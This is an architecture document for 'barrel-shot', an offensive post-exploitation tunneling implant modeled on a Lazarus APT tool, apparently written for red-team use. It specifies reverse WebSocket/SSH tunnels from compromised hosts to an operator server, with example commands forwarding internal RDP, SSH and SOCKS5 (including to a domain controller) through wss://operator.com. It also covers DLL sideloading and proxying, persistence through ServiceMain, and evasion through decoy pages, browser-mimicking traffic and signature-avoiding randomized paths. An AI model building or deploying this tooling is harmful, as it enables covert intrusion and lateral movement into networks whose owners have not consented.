# Barrel Shot - Architecture

RDP/SSH tunneling tool for post-exploitation lateral movement. Modeled after Hookshot (Lazarus APT) with implementation patterns from chisel and ligolo-ng.

## Role in Triple Barrel Pipeline

```
barrel-kit (UDRL loader)
  -> deploys Adaptix agent
    -> agent downloads barrel-shot
      -> barrel-shot opens RDP/SSH tunnel into target network
```

Barrel-shot is the tunnel. It runs on the compromised host, connects back to the operator, and forwards RDP/SSH traffic into the internal network.

## Design Decisions

| Decision | Choice | Why |
|---|---|---|
| Transport | WebSocket over HTTPS | Firewall-friendly, blends with web traffic, CDN-compatible |
| Encryption | SSH inside WebSocket (chisel pattern) | Encryption + multiplexing for free, no custom crypto |
| Multiplexing | SSH channels (native) | Each tunnel = SSH channel, no yamux dependency |
| Network layer | Transport-layer proxy (not TUN) | No root/admin on operator side, simpler, matches Hookshot's profile |
| Connection direction | Agent dials out (reverse connect) | Standard post-exploitation pattern, NAT-friendly |
| Auth | Pre-shared key + SSH fingerprint verification | Simple, no PKI needed, operator controls key distribution |
| Build target | Windows DLL + standalone EXE | DLL for sideloading (like Hookshot), EXE for direct execution |

## Architecture Overview

```
  OPERATOR SIDE                           TARGET NETWORK
  +-------------------+                   +-------------------+
  |  barrel-shot      |                   |  barrel-shot      |
  |  server           |<--[WSS/SSH]-------+  agent            |
  |                   |                   |                   |
  |  - listener       |                   |  - reverse conn   |
  |  - tunnel binder  |                   |  - tunnel defs    |
  |  - logging        |                   |  - socks5 proxy   |
  |                   |                   |  - reconnect loop |
  +-------------------+                   +-------------------+
        |                                       |
        v                                       v
   RDP client                             target:3389 (RDP)
   SSH client                             target:22   (SSH)
   proxychains                            target:*    (SOCKS5)
```

## Components

### Agent (deployed on target)

Runs on the compromised host. Connects back to the operator's server.

- **Reverse WebSocket connection**: dials out to operator over HTTPS (port 443)
- **SSH session**: establishes SSH inside the WebSocket for encrypted multiplexed channels
- **Local forwarding**: forwards operator traffic to internal targets (RDP 3389, SSH 22, arbitrary ports)
- **SOCKS5 proxy**: optional dynamic forwarding for flexible pivoting
- **Reconnect**: exponential backoff with jitter, configurable max retries
- **Execution modes**:
  - Standalone EXE
  - DLL sideload with configurable trigger (`DllMain` or any exported function)
  - Exported entry points: `GoNow` (non-blocking), `RunAgent` (blocking), `ServiceMain`
  - In-memory execution via Struggle/Adaptix COFF loader

Config embedded at build time:
```
- Server URL (WSS endpoint)
- Pre-shared key
- Server fingerprint
- Reconnect interval (min/max)
- Tunnel definitions (optional, can be pushed from server)
- Trigger function (DllMain or named export)
```

### Server (operator side)

Runs on the operator's infrastructure. Accepts agent connections, binds tunnels.

- **HTTPS listener**: serves a legitimate-looking page for non-agent traffic (like chisel's `--backend`)
- **WebSocket upgrade**: agents connect via WebSocket, upgrade to SSH
- **Tunnel binder**: when an agent connects, opens the requested local ports and routes traffic
- **Logging**: prints connect/disconnect events and tunnel status to stdout

### CLI

Single binary, two modes (like chisel). Operator runs `server`, target runs `agent`. The agent's tunnels are defined at the command line (or baked in at compile time) - no runtime session management.

```
barrel-shot server [flags]
barrel-shot agent [flags] <server-url> <remotes...>
barrel-shot keygen [flags]
```

#### `agent`

The tunnel definitions live here. Compile with args hardcoded, or run manually.

```
barrel-shot agent [flags] <server-url> <remotes...>
  --fingerprint      Server SSH fingerprint (MITM protection)
  --auth             Auth credentials <user:pass>
  --keepalive        Keepalive interval (default: 15s)
  --max-retry        Max reconnect attempts (default: unlimited)
  --retry-interval   Base reconnect interval (default: 1s)
  --proxy            Upstream proxy (HTTP CONNECT or SOCKS5)
  -v                 Verbose logging
```

Tunnel syntax (same as chisel):
```

<local-host>:<local-port>:<remote-host>:<remote-port>
R:<listen-host>:<listen-port>:<target-host>:<target-port>
socks
R:socks

```

Examples:
```sh
# forward target's RDP to operator's :13389
barrel-shot agent wss://operator.com R:13389:10.10.5.50:3389

# forward target's SSH + RDP
barrel-shot agent wss://operator.com R:13389:10.10.5.50:3389 R:12222:10.10.5.50:22

# SOCKS5 for full pivoting
barrel-shot agent wss://operator.com R:socks

# reverse SOCKS5 + specific RDP forward
barrel-shot agent wss://operator.com R:1080:socks R:13389:dc01:3389

# all tunnels defined, auth + fingerprint pinned
barrel-shot agent \
  --auth op:s3cret \
  --fingerprint SHA256:xK8q3...Ym4= \
  wss://operator.com \
  R:13389:10.10.5.50:3389 \
  R:12222:10.10.5.50:22 \
  R:socks
```

When compiled with embedded config via `make`, runs with no arguments:
```
barrel-shot agent
```

#### `server`

Accepts agent connections, logs tunnel activity. Operator-facing, so flags are flexible.

```
barrel-shot server [flags]
  --listen, -l      Listen address (default: 0.0.0.0:443)
  --keyfile          SSH private key file (generates ephemeral if missing)
  --auth             Required agent auth <user:pass>
  --backend          Reverse-proxy non-agent HTTP to this URL
  --tls-cert         TLS certificate
  --tls-key          TLS private key
  --reverse          Allow reverse port forwards from agents (default: true)
  --socks5           Allow SOCKS5 from agents (default: true)
  --keepalive        Keepalive interval (default: 15s)
  -v                 Verbose logging
```

Output on agent connect:
```
[+] Agent connected: 10.10.5.23 (DESKTOP-ABC)
[+] Tunnel: 0.0.0.0:13389 -> 10.10.5.50:3389 (RDP)
[+] Tunnel: 0.0.0.0:12222 -> 10.10.5.50:22 (SSH)
[+] SOCKS5: 0.0.0.0:1080
```

The server just accepts what the agent requests. No shell, no session management - just log and serve.

#### `keygen`

```
barrel-shot keygen [flags]
  --out, -o          Output key file (default: stdout)
  --type             Key type: ecdsa, ed25519 (default: ed25519)
```

```
$ barrel-shot keygen -o server.key
Fingerprint: SHA256:xK8q3...Ym4=
```

## Protocol

### Connection Flow

```
1. Agent -> Server:  HTTPS GET /ws (WebSocket upgrade)
   Headers:
     Upgrade: websocket
     X-Session-ID: <random-uuid>
     X-Auth: <HMAC-SHA256(psk, session-id + timestamp)>

2. Server validates auth, upgrades to WebSocket

3. Agent -> Server:  SSH handshake inside WebSocket
   - Agent verifies server fingerprint
   - Server verifies agent PSK via SSH auth

4. Agent -> Server:  Tunnel registration (SSH global request)
   - Agent sends its tunnel definitions (from CLI args or embedded config)
   - Server validates and binds local ports

5. Tunnel data flows as SSH channels
   - Each tunnel = one SSH channel type "barrel-shot"
   - Bidirectional byte copy (io.Copy)
```

### Keepalive

- SSH keepalive ping every 15s (configurable)
- Server marks agent stale after 3 missed pings
- Agent reconnects on connection drop (backoff: 1s -> 5m, jitter: 0-30%)

### Tunnel Types

| Type | Syntax | Description |
|---|---|---|
| Local forward | `L:13389:10.10.5.50:3389` | Server binds :13389, forwards to target RDP |
| Remote forward | `R:3389:localhost:3389` | Agent binds on target, forwards back to server |
| SOCKS5 | `socks` or `S:1080` | Dynamic forwarding through agent |

## Package Structure

```
barrel-shot/
  main.go               # entrypoint, dispatches server/agent/keygen subcommands
  Makefile              # build targets: agent, server, cross-compile, config embedding
  server/
    server.go            # HTTPS listener, WS upgrade, SSH server, tunnel binding, keepalive
  agent/
    agent.go             # WS dial, SSH client, reconnect loop, SOCKS5, channel forwarding
    embed.go             # build-time config vars (set via -ldflags -X), incl. trigger function
    exports.go           # CGO exports (GoNow, RunAgent, ServiceMain), conditional init (dll+windows)
  share/
    protocol.go          # version string, channel type constant
    crypto.go            # ed25519 keygen, SHA256 fingerprint
    tls.go               # self-signed TLS cert generation
    wsconn.go            # WebSocket -> net.Conn adapter
    rwcconn.go           # io.ReadWriteCloser -> net.Conn adapter (for go-socks5)
    pipe.go              # bidirectional io.Copy with half-close
    remote.go            # tunnel definition parsing, config encode/decode
  docs/
    ARCHITECTURE.md
    PLAN.md
    lab.md               # lab environment (gitignored)
  references/            # cloned reference repos (not committed)
```

## Dependencies

| Package | Purpose |
|---|---|
| `golang.org/x/crypto/ssh` | SSH protocol, channels, auth, multiplexing |
| `gorilla/websocket` | WebSocket transport |
| `armon/go-socks5` | SOCKS5 proxy |

No custom crypto. SSH handles encryption and multiplexing. WebSocket handles HTTP traversal.

## Build Modes

All builds go through `make`. Config is baked into the agent via `-ldflags`.

### Standalone EXE (default)

```
make agent SERVER=wss://operator.com AUTH=op:secret FINGERPRINT=SHA256:xK8q3...
```

Single binary, runs as `barrel-shot agent`. Server mode is the same binary (`barrel-shot server`).

### DLL Sideload

```
make dll PROXY=./python315.dll FUNCTION=Py_Main SERVER=wss://operator.com AUTH=op:secret
```

Compiles with `CGO_ENABLED=1 -buildmode=c-shared`. `FUNCTION` controls the trigger:
- `DllMain` (default)  - agent starts on DLL load via Go `init()`
- Any named export (e.g. `Py_Main`)  - agent starts when host calls that function; trigger blocks with `Sleep(INFINITE)` to keep process alive

Exports:
- `GoNow` - starts agent in background goroutine (non-blocking)
- `RunAgent` - starts agent (blocking)
- `ServiceMain` - for service registration persistence

DLL proxying: original DLL renamed with `_` suffix (e.g. `python315_.dll`), loaded from the same directory. All exports forwarded via generated C stubs (`proxygen`).

### Shellcode (stretch goal)

Convert EXE to PIC shellcode via sRDI or donut for in-memory execution through Struggle's COFF loader.

### Cross-compilation

```
make agent GOOS=windows GOARCH=amd64   # Windows x64 (default)
make agent GOOS=linux GOARCH=amd64     # Linux x64
make agent-all                          # All platform combos
```

## Security Considerations

- PSK never sent in plaintext - used as HMAC key, verified through SSH auth
- Server fingerprint pinned in agent config - prevents MITM
- No credentials in CLI output or logs (per AGENTS.md)
- Agent config encrypted at rest when embedded in DLL
- WebSocket path randomized per-build to avoid static signatures
- User-Agent mimics legitimate browser traffic

## References

- `./references/chisel/` - SSH-over-WebSocket pattern, CLI design
- `./references/ligolo-ng/` - yamux multiplexing, TUN approach (not used but informative)
- `./references/go-socks5/` - SOCKS5 implementation
- `./references/sshego/` - Go SSH tunneling library
- `./references/rdpgw/` - RDP Gateway in Go
- `./references/grdp/` - Pure Go RDP protocol
- `../references/operation-double-barrel.md` - Hookshot context, kill chain position
